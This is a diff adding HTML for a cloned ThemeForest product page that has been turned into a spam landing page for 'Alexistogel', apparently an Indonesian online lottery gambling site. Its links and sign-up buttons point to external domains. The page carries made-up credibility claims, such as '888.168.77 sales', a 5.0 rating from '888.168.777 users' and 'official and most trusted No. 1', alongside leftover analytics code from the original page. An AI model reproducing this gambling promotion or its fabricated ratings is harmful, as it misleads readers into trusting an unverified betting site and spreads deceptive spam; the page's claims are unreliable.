+                                                    <img class="elements-nav__logo-container" loading="lazy" src="https://kilat.digital/images/2025/08/12/5d7dd8d2aa39755dc815f9393480d8a4.gif" alt="Elements logo" height="23" width="101">
+
+                                                    <div class="elements-nav__punch-line" bis_skin_checked="1">
+                                                        <h2>
+                                                            Looking for unlimited downloads?
+                                                        </h2>
+                                                        <p>
+                                                            Subscribe to Envato Elements.
+                                                        </p>
+                                                        <ul>
+                                                            <li>
+                                                                <img src="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" alt="badge" width="20" height="20"> Millions of
+                                                                premium assets
+                                                            </li>
+                                                            <li>
+                                                                <img src="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" alt="thumbs up" width="20" height="20"> Great
+                                                                value subscription
+                                                            </li>
+                                                        </ul>
+                                                        <button class="brand-neue-button brand-neue-button__open-in-new elements-nav__cta">Let's
+                                                            create</button>
+                                                        <p></p>
+                                                    </div>
+                                                </div>
+                                                <div class="elements-nav__secondary-panel" bis_skin_checked="1">
+                                                    <img class="elements-nav__secondary-panel__collage" loading="lazy" src="https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg" srcset="https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg 2x"
+                                                        alt="Collage of Elements items" width="267" height="233">
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="header-site-floating-logo__container" bis_skin_checked="1">
+                                            <div class="" bis_skin_checked="1">
+                                        </div>
+                                    </nav>
+                                </div>
+                            </div>
+
+                        </div>
+
+                        <div class="site-header__categories is-hidden-tablet-and-below" bis_skin_checked="1">
+                            <div class="header-categories" bis_skin_checked="1">
+                                <div class="grid-container -layout-wide" bis_skin_checked="1">
+                                    <ul class="header-categories__links">
+                                        <li class="header-categories__links-item">
+                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-0-dropdown" href="https://www.paperhall.org/halloffame">
+
+                                                ALEXISTOGEL
+
+                                            </a>
+                                        </li>
+                                        <li class="header-categories__links-item">
+                                            <a class="header-categories__main-link header-categories__main-link--empty" href="https://www.paperhall.org/halloffame">
+
+                                                BANDAR TOGEL
+
+                                            </a>
+                                        </li>
+                                        <li class="header-categories__links-item">
+                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-5-dropdown" href="https://www.paperhall.org/halloffame">
+
+                                                TOGEL ONLINE
+
+                                            </a>
+                                        </li>
+                                        <li class="header-categories__links-item">
+                                            <a class="header-categories__main-link header-categories__main-link--empty" href="https://www.paperhall.org/halloffame">
+
+                                                BANDAR TOGEL ONLINE
+
+                                            </a>
+                                        </li>
+                                        <li class="header-categories__links-item">
+                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-7-dropdown" href="https://www.paperhall.org/halloffame">
+
+                                                TOTO SLOT
+
+                                            </a>
+                                        </li>
+                                    </ul>
+                                    <div class="header-categories__search" bis_skin_checked="1">
+                                        <form id="search" data-view="searchField" action="https://www.paperhall.org/halloffame" accept-charset="UTF-8" method="get">
+                                            <div class="search-field -border-light h-ml2" bis_skin_checked="1">
+                                                <div class="search-field__input" bis_skin_checked="1">
+                                                    <input id="term" name="term" class="js-term search-field__input-field" type="search" placeholder="Search">
+                                                </div>
+                                                <button class="search-field__button" type="submit">
+                                                        <i class="e-icon -icon-search"><span
+                                                                class="e-icon__alt">Search</span></i>
+                                                    </button>
+                                            </div>
+                                        </form>
+                                    </div>
+
+                                </div>
+                            </div>
+
+                        </div>
+
+                    </header>
+                </div>
+
+                <div class="js-canvas__body canvas__body" bis_skin_checked="1">
+                    <div class="grid-container" bis_skin_checked="1">
+                    </div>
+
+
+
+                    <div class="context-header " bis_skin_checked="1">
+                        <div class="grid-container " bis_skin_checked="1">
+                            <nav class="breadcrumbs h-text-truncate  ">
+
+                                <a class="js-breadcrumb-category" href="https://www.paperhall.org/halloffame">ALEXISTOGEL</a>
+
+
+                                <a href="https://www.paperhall.org/halloffame" class="js-breadcrumb-category">BANDAR TOGEL</a>
+
+                                <a class="js-breadcrumb-category" href="https://www.paperhall.org/halloffame">SITUS TOTO</a>
+                            </nav>
+
+                            <div class="item-header" data-view="itemHeader" bis_skin_checked="1">
+                                <div class="item-header__top" bis_skin_checked="1">
+                                    <div class="item-header__title" bis_skin_checked="1">
+                                        <h1 class="t-heading -color-inherit -size-l h-m0 is-hidden-phone">ALEXISTOGEL : BANDAR TOGEL ONLINE RESMI & TERPERCAYA NO 1 DI INDONESIA DENGAN HADIAH TERBESAR</h1>
+
+                                        <h1 class="t-heading -color-inherit -size-xs h-m0 is-hidden-tablet-and-above">
+                                            Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar
+                                        </h1>
+                                    </div>
+
+                                    <div class="item-header__price is-hidden-desktop" bis_skin_checked="1">
+                                        <a class="js-item-header__cart-button e-btn--3d -color-primary -size-m" rel="nofollow" title="Add to Cart" data-view="modalAjax" href="https://www.paperhall.org/halloffame">
+                                            <span class="item-header__cart-button-icon">
+                                                <i class="e-icon -icon-cart -margin-right"></i>
+                                            </span>
+
+                                            <span class="t-heading -size-m -color-light -margin-none">
+                                                <b class="t-currency"><span class="js-item-header__price">$85.0</span></b>
+                                            </span>
+                                        </a>
+                                    </div>
+                                </div>
+
+                                <div class="item-header__details-section" bis_skin_checked="1">
+                                    <div class="item-header__author-details" bis_skin_checked="1">
+                                        By <a rel="author" class="js-by-author" href="https://www.paperhall.org/halloffame">ALEXISTOGEL</a>
+                                    </div>
+                                    <div class="item-header__sales-count" bis_skin_checked="1">
+                                        <svg width="16px" height="16px" viewBox="0 0 16 16" class="item-header__sales-count-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
+                                            <title>Cart</title>
+                                            <path
+                                                d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 15.23 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.777 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
+                                            </path>
+
+                                        </svg>
+
+                                        <strong>888.168.77</strong> sales
+                                    </div>
+                                    <div class="item-header__envato-highlighted" bis_skin_checked="1">
+                                        <strong>BANDAR TOGEL</strong>
+                                        <svg width="16px" height="16px" viewBox="0 0 14 14" class="item-header__envato-checkmark-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
+                                            <title></title>
+                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                d="M0.333252 7.00004C0.333252 3.31814 3.31802 0.333374 6.99992 0.333374C8.76803 0.333374 10.4637 1.03575 11.714 2.286C12.9642 3.53624 13.6666 5.23193 13.6666 7.00004C13.6666 10.6819 10.6818 13.6667 6.99992 13.6667C3.31802 13.6667 0.333252 10.6819 0.333252 7.00004ZM6.15326 9.23337L9.89993 5.48671C10.0227 5.35794 10.0227 5.15547 9.89993 5.02671L9.54659 4.67337C9.41698 4.54633 9.20954 4.54633 9.07993 4.67337L5.91993 7.83337L4.91993 6.84004C4.85944 6.77559 4.77498 6.73903 4.68659 6.73903C4.5982 6.73903 4.51375 6.77559 4.45326 6.84004L4.09993 7.19337C4.03682 7.25596 4.00133 7.34116 4.00133 7.43004C4.00133 7.51892 4.03682 7.60412 4.09993 7.66671L5.68659 9.23337C5.74708 9.29782 5.83154 9.33439 5.91993 9.33439C6.00832 9.33439 6.09277 9.29782 6.15326 9.23337Z"
+                                                fill="#79B530"></path>
+
+                                        </svg>
+
+                                    </div>
+                                </div>
+
+
+                            </div>
+
+
+
+                            <!-- Desktop Item Navigation -->
+                            <div class="is-hidden-tablet-and-below page-tabs" bis_skin_checked="1">
+                                <ul>
+                                    <li class="selected"><a class="js-item-navigation-item-details t-link -decoration-none" href="https://www.paperhall.org/halloffame">Item Details</a>
+                                    </li>
+                                    <li><a class="js-item-navigation-reviews t-link -decoration-none" href=""><span>Reviews</span><span>
+                                                <div class="rating-detailed-small" bis_skin_checked="1">
+                                                    <div class="rating-detailed-small__header" bis_skin_checked="1">
+                                                        <div class="rating-detailed-small__stars" bis_skin_checked="1">
+                                                            <div class="rating-detailed-small-center__star-rating"
+                                                                bis_skin_checked="1">
+                                                                <i class="e-icon -icon-star">
+                                                                </i> <i class="e-icon -icon-star">
+                                                                </i> <i class="e-icon -icon-star">
+                                                                </i> <i class="e-icon -icon-star">
+                                                                </i> <i class="e-icon -icon-star">
+                                                                </i>
+                                                            </div>
+                                                            5.00
+                                                            <span class="is-visually-hidden">5.00 stars</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </span><span class="item-navigation-reviews-comments">10,680</span></a></li>
+                                    <li><a class="js-item-navigation-comments t-link -decoration-none" href=""><span>Comments</span><span
+                                                class="item-navigation-reviews-comments">4,890</span></a></li>
+                                    <li><a class="js-item-navigation-support t-link -decoration-none" href="">Support</a>
+                                    </li>
+                                </ul>
+                            </div>
+    <!-- Tablet or below Item Navigation -->
+    <div class="page-tabs--dropdown" data-view="replaceItemNavsWithRemote" data-target=".js-remote" bis_skin_checked="1">
+        <div class="page-tabs--dropdown__slt-custom-wlabel" bis_skin_checked="1">
+            <div class="slt-custom-wlabel--page-tabs--dropdown" bis_skin_checked="1">
+                <label>
+                                            <span class="js-label">
+                                                Item Details
+                                            </span>
+                                            <span class="slt-custom-wlabel__arrow">
+                                                <i class="e-icon -icon-arrow-fill-down"></i>
+                                            </span>
+                                        </label>
+
+                <select class="js-remote">
+                                            <option selected="selected"
+                                                data-url="/item/marketica-marketplace-wordpress-theme/8988002">Item
+                                                Details</option>
+                                            <option
+                                                data-url="/item/marketica-marketplace-wordpress-theme/reviews/8988002">
+                                                Reviews (75)</option>
+                                            <option
+                                                data-url="/item/marketica-marketplace-wordpress-theme/8988002/comments">
+                                                Comments (802)</option>
+                                            <option
+                                                data-url="/item/marketica-marketplace-wordpress-theme/8988002/support">
+                                                Support</option>
+
+                                        </select>
+            </div>
+        </div>
+    </div>
+
+    <div class="page-tabs" bis_skin_checked="1">
+        <ul class="right item-bookmarking__left-icons_hidden" data-view="bookmarkStatesLoader">
+            <li class="js-favorite-widget item-bookmarking__control_icons--favorite" data-item-id="8988002"><a data-view="modalAjax" class="t-link -decoration-none" href="https://www.paperhall.org/halloffame"><span
+                                                class="item-bookmarking__control--label">Add to Favorites</span></a>
+            </li>
+            <li class="js-collection-widget item-bookmarking__control_icons--collection" data-item-id="8988002"><a data-view="modalAjax" class="t-link -decoration-none" href="https://www.paperhall.org/halloffame"><span
+                                                class="item-bookmarking__control--label">Add to Collection</span></a>
+            </li>
+        </ul>
+    </div>
+
+
+    </div>
+    </div>
+
+
+    <div class="content-main" id="content" bis_skin_checked="1">
+
+        <div class="grid-container" bis_skin_checked="1">
+            <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+                //<![CDATA[
+                window.GtmMeasurements.sendAnalyticsEvent({
+                    "eventName": "view_item",
+                    "eventType": "user",
+                    "ecommerce": {
+                        "currency": "USD",
+                        "value": 37.0,
+                        "items": [{
+                            "affiliation": "themeforest",
+                            "item_id": 8988002,
+                            "item_name": "Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar",
+                            "item_brand": "tokopress",
+                            "item_category": "wordpress",
+                            "item_category2": "ecommerce",
+                            "item_category3": "woocommerce",
+                            "price": 37.0,
+                            "quantity": 1,
+                            "item_add_on": "bundle_6month",
+                            "item_variant": "regular"
+                        }]
+                    }
+                });
+
+                //]]>
+            </script>
+
+
+            <div bis_skin_checked="1">
+                <link href="https://kilat.digital/images/2025/08/12/5d7dd8d2aa39755dc815f9393480d8a4.gif">
+
+                <div class="content-s " bis_skin_checked="1">
+                    <div class="item-bookmarking__left-icons__wrapper" bis_skin_checked="1">
+                        <ul class="item-bookmarking__left-icons" data-view="bookmarkStatesLoader">
+                            <li class="item-bookmarking__control_icons--favorite">
+                                <span>
+                                                    <a title="Add to Favorites" data-view="modalAjax"
+                                                        href="https://www.paperhall.org/halloffame"><span
+                                                            class="item-bookmarking__control--label">Add to
+                                                            Favorites</span></a>
+                                </span>
+
+                            </li>
+                            <li class="item-bookmarking__control_icons--collection">
+                                <span>
+                                                    <a title="Add to Collection" data-view="modalAjax"
+                                                        href="https://www.paperhall.org/halloffame">
+                                                        <span class="item-bookmarking__control--label">Add to
+                                                            Collection</span>
+                                </a>
+                                </span>
+
+                            </li>
+                        </ul>
+                    </div>
+                    
+
+                    <div class="box--no-padding" bis_skin_checked="1">
+                        <div class="item-preview live-preview-btn--blue -preview-live" bis_skin_checked="1">
+
+
+
+                            <a target="_blank" href="https://paperhall.pages.dev/"><img alt="Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar - WooCommerce eCommerce" width="540" height="540" srcset="https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg" sizes="(min-width: 1024px) 590px, (min-width: 1px) 100vw, 600px"
+                                    src="https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg"></a>
+                            <div class="js- item-preview-image__gallery" data-title="Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar - WooCommerce eCommerce Screenshots Gallery" data-url="marketica-marketplace-wordpress-theme/screenshots/modal/8988002" bis_skin_checked="1">
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/00-marketica-preview-sale37.jpg">MARKETICA_PREVIEW/00-marketica-preview-sale37.jpg</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/01_marketica2_homepage.png">MARKETICA_PREVIEW/01_marketica2_homepage.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/02_marketica2_shop_page.png">MARKETICA_PREVIEW/02_marketica2_shop_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/03_marketica2_single_product_page.png">MARKETICA_PREVIEW/03_marketica2_single_product_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/04_marketica2_cart_page.png">MARKETICA_PREVIEW/04_marketica2_cart_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/05_marketica2_checkout_page.png">MARKETICA_PREVIEW/05_marketica2_checkout_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/06_marketica2_myaccount_login_page.png">MARKETICA_PREVIEW/06_marketica2_myaccount_login_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/07_marketica2_plan_and_pricing_page.png">MARKETICA_PREVIEW/07_marketica2_plan_and_pricing_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/08_marketica2_team_members_page.png">MARKETICA_PREVIEW/08_marketica2_team_members_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/09_marketica2_contact_page_template.png">MARKETICA_PREVIEW/09_marketica2_contact_page_template.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/10_marketica2_blog_page.png">MARKETICA_PREVIEW/10_marketica2_blog_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/11_marketica2_blog_post_formats.png">MARKETICA_PREVIEW/11_marketica2_blog_post_formats.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/12_marketica2_single_product_page.png">MARKETICA_PREVIEW/12_marketica2_single_product_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/13_marketica2_theme_customizer.png">MARKETICA_PREVIEW/13_marketica2_theme_customizer.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/14_marketica2_visualcomposer_templates.png">MARKETICA_PREVIEW/14_marketica2_visualcomposer_templates.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/15_marketica2_tablet_view.png">MARKETICA_PREVIEW/15_marketica2_tablet_view.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/16_marketica2_tablet_view_offcanvas_menu.png">MARKETICA_PREVIEW/16_marketica2_tablet_view_offcanvas_menu.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/17_marketica2_themeoptions_header.png">MARKETICA_PREVIEW/17_marketica2_themeoptions_header.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/18_marketica2_themeoptions_footer.png">MARKETICA_PREVIEW/18_marketica2_themeoptions_footer.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/19_marketica2_themeoptions_contact.png">MARKETICA_PREVIEW/19_marketica2_themeoptions_contact.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/20_marketica2_themeoptions_woocommerce.png">MARKETICA_PREVIEW/20_marketica2_themeoptions_woocommerce.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/21_marketica2_wcvendors_user_page.png">MARKETICA_PREVIEW/21_marketica2_wcvendors_user_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/22_marketica2_wcvendors_vendor_page.png">MARKETICA_PREVIEW/22_marketica2_wcvendors_vendor_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/23_marketica2_wcvendors_vendor_dashboard.png">MARKETICA_PREVIEW/23_marketica2_wcvendors_vendor_dashboard.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/24_marketica2_wcvendors_shop_settings.png">MARKETICA_PREVIEW/24_marketica2_wcvendors_shop_settings.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/25_marketica2_dokan_vendor_store_page.png">MARKETICA_PREVIEW/25_marketica2_dokan_vendor_store_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/26_marketica2_dokan_vendor_review_page.png">MARKETICA_PREVIEW/26_marketica2_dokan_vendor_review_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/27_marketica2_dokan_vendor_dashboard_page.png">MARKETICA_PREVIEW/27_marketica2_dokan_vendor_dashboard_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/28_marketica2_dokan_vendor_dashboard_products_page.png">MARKETICA_PREVIEW/28_marketica2_dokan_vendor_dashboard_products_page.png</a>
+                                <a class="is-hidden" href="https://s3.envato.com/files/344043819/MARKETICA_PREVIEW/29_marketica2_dokan_vendor_dashboard_settings_page.png">MARKETICA_PREVIEW/29_marketica2_dokan_vendor_dashboard_settings_page.png</a>
+                            </div>
+
+                            <div class="item-preview__actions" bis_skin_checked="1">
+                                <div id="fullscreen" class="item-preview__preview-buttons" bis_skin_checked="1">
+                               <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper='true'> 
+                                <a href="https://paperhall.pages.dev/" class="register">Daftar</a>
+                                <a href="https://paperhall.pages.dev/" class="login">Login</a>
+<style>
+/* Tombol umum */
+  .login, .register {
+  display: inline-block;
+  padding: 14px 80px;
+  font-size: 16px;
+  font-weight: bold;
+  text-transform: uppercase;
+  text-decoration: none;
+  border-radius: 8px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  transition: all 0.3s ease;
+  cursor: pointer;
+  color: #fff;
+}
+@media (min-width: 1024px) {
+    .content-main {
+        min-height:540px;
+        background: url(https://kilat.digital/images/2025/08/07/33a83bac0212c82156cc559e0f3dd98c.jpg);
+    }
+}
+/* Tombol Login (Hitam Elegan) */
+.login {
+  background: linear-gradient(145deg, #fffb00, #2c2c2c);
+  border: 2px solid #eeff00;
+  text-shadow: 1px 1px #000;
+}
+.login:hover {
+  background: linear-gradient(145deg, #ff0000, #ff0000);
+  box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+  transform: translateY(-3px);
+}
+
+/* Tombol Register (Orange) */
+.register {
+  background: linear-gradient(145deg, #ff0000, #ff0000);
+  border: 2px solid #fff2cc;
+  text-shadow: 1px 1px #8b3e00;
+}
+.register:hover {
+  background: linear-gradient(145deg, #fbff00, #fbff00);
+  box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+  transform: translateY(-3px);
+}
+
+/* Tambahan efek ringan */
+.login:active, .register:active {
+  transform: translateY(1px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+}
+</style>
+</button>
+</div>
+                                </div>
+                            </div>
+                            
+
+                        </div>
+                    </div>
+
+
+                    <div data-view="toggleItemDescription" bis_skin_checked="1">
+                        <div class="js-item-togglable-content has-toggle" bis_skin_checked="1">
+                        
+                            <div class="js-item-description-toggle item-description-toggle" bis_skin_checked="1">
+                                <a class="item-description-toggle__link" href="https://www.paperhall.org/halloffame">
+                                    <span>Show More <i class="e-icon -icon-chevron-down"></i></span>
+                                    <span class="item-description-toggle__less">Show Less <i
+                                                            class="e-icon -icon-chevron-down -rotate-180"></i></span>
+                                                    
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <section data-view="recommendedItems" data-url="/item/marketica-marketplace-wordpress-theme/8988002/recommended_items" id="recommended_items">
+                        <div class="author-recommended-collection" bis_skin_checked="1">
+
+
+                            <ul class="author-recommended-collection__list" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_item_list&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;item_list_name&quot;:&quot;Author Recommended tokopress&quot;,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26116208,&quot;item_name&quot;:&quot;Retrave | Travel \u0026 Tour Agency Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;travel-accomodation&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:1},{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26126773,&quot;item_name&quot;:&quot;Coursly | Education \u0026 Offline Course Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;education&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:2},{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26416085,&quot;item_name&quot;:&quot;Sweeding | Wedding Event Invitation Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;weddings&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:3}]},&quot;item_list_id&quot;:8435762}">
+
+
+
+                            </ul>
+                        </div>
+                        <div bis_skin_checked="1">
+
+                        </div>
+                    </section>
+                        <h1 style="background-color: white; padding-left: 10px;">Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar</h1>
+                    <p style="background-color: white; padding-left: 10px;">Alexistogel hadir menjadi bandar togel online resmi dan terpercaya, dengan semua keunggulannya untuk dibagikan kepada para pemain. Platform yang sudah ada sejak dari 2014, telah menjadi destinasi favorit para togelers dalam memasang angka taruhan togel. Di situs resmi Alexistogel anda bisa mulai bermain pasaran toto lengkap, dari ratusan bahkan ribuan pasaran internasional.
+
+</p>
+                    <div class="app-card">
+  <div class="app-header">INFORMASI LENGKAP ALEXISTOGEL</div>
+  <table class="app-table">
+    <tr><th>NAMA SITUS</th><td>ALEXISTOGEL</td></tr>
+    <tr><th>PASARAN TERPOPULER</th><td>MACAU, HONGKONG, SINGAPORE</td></tr>
+    <tr><th>DEPOSIT VIA</th><td>ALL BANK, E-WALLET, QRIS</td></tr>
+    <tr><th>MINIMAL DEPOSIT</th><td>IDR 5,000</td></tr>
+    <tr>
+      <th>RATING</th>
+      <td>
+        <span class="badge">
+          <span class="stars lg" style="--rating:5.0" aria-label="Rating rata-rata 4.9 dari 5"></span>
+          <small>5.0 dari 888.168.777 pengguna</small>
+        </span>
+      </td>
+    </tr>
+  </table>
+</div>
+                    <div data-view="itemPageScrollEvents" bis_skin_checked="1"></div>
+                </div>
+
+                <div class="sidebar-l sidebar-right" bis_skin_checked="1">
+
+
+                    <div class="pricebox-container" bis_skin_checked="1">
+                        <div class="purchase-panel" bis_skin_checked="1">
+                            <div id="purchase-form" class="purchase-form" bis_skin_checked="1">
+                                <form data-view="purchaseForm" data-analytics-has-custom-click="true" data-analytics-click-payload="{&quot;eventName&quot;:&quot;add_to_cart&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;quantityUpdate&quot;:false,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;value&quot;:37.0,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:8988002,&quot;item_name&quot;:&quot;Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;wordpress&quot;,&quot;item_category2&quot;:&quot;ecommerce&quot;,&quot;item_category3&quot;:&quot;woocommerce&quot;,&quot;price&quot;:&quot;37&quot;,&quot;quantity&quot;:1}]}}"
+                                    action="https://www.paperhall.org/halloffame" accept-charset="UTF-8" method="post">
+                                    <input type="hidden" name="authenticity_token" value="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ" autocomplete="off">
+                                    <div bis_skin_checked="1">
+                                        <div data-view="itemVariantSelector" data-id="8988002" data-cookiebot-enabled="true" bis_skin_checked="1">
+                                            <div class="purchase-form__selection" bis_skin_checked="1">
+                                                <span class="purchase-form__license-type">
+                                                                    <span data-view="flyout" class="flyout">
+                                                                        <span
+                                                                            class="js-license-selector__chosen-license purchase-form__license-dropdown">Regular
+                                                                            License</span>
+                                                <div class="js-flyout__body flyout__body -padding-side-removed" bis_skin_checked="1">
+                                                    <span class="js-flyout__triangle flyout__triangle"></span>
+                                                    <div class="license-selector" data-view="licenseSelector" bis_skin_checked="1">
+                                                        <div class="js-license-selector__item license-selector__item" data-license="regular" data-name="Regular License" bis_skin_checked="1">
+
+                                                            <div class="license-selector__license-type" bis_skin_checked="1">
+                                                                <span class="t-heading -size-xxs">Regular
+                                                                                            License</span>
+                                                                <span class="js-license-selector__selected-label e-text-label -color-green -size-s " data-license="regular">Selected</span>
+                                                            </div>
+                                                            <div class="license-selector__price" bis_skin_checked="1">
+                                                                <span class="t-heading -size-m h-m0">
+                                                                                            <b class="t-currency"><span
+                                                                                                    class="">$88</span></b>
+                                                                </span>
+                                                            </div>
+                                                            <div class="license-selector__description" bis_skin_checked="1">
+                                                                <p class="t-body -size-m h-m0">
+                                                                    Use, by you or one client, in a single end product which end users <strong>are
+                                                                                                not</strong> charged for. The total price includes the item price and a buyer fee.</p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="flyout__link" bis_skin_checked="1">
+                                                        <p class="t-body -size-m h-m0">
+                                                            <a class="t-link -decoration-reversed" target="_blank" href="https://www.paperhall.org/halloffame/licenses/standard">View
+                                                                                        license details</a>
+                                                        </p>
+                                                    </div>
+                                                </div>
+                                                </span>
+
+
+                                                <input type="hidden" name="license" id="license" value="regular" class="js-purchase-default-license" data-license="regular" autocomplete="off">
+                                                </span>
+
